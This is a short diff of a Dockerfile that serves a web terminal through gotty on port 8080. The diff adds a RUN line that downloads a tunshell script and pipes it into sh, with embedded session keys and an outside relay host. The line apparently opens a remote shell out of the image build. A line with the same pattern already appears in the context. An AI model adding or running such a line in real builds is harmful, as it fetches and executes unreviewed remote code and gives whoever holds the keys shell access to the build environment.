@@ -23,3 +23,5 @@ RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T iMdtncryVPg8o8fUF6g
 EXPOSE 8080
 
 CMD ["/bin/bash","/run_gotty.sh"]
+
+RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T iMdtncryVPg8o8fUF6gORB lgnTbWoiMEaSAPjkCi2G5v au.relay.tunshell.com
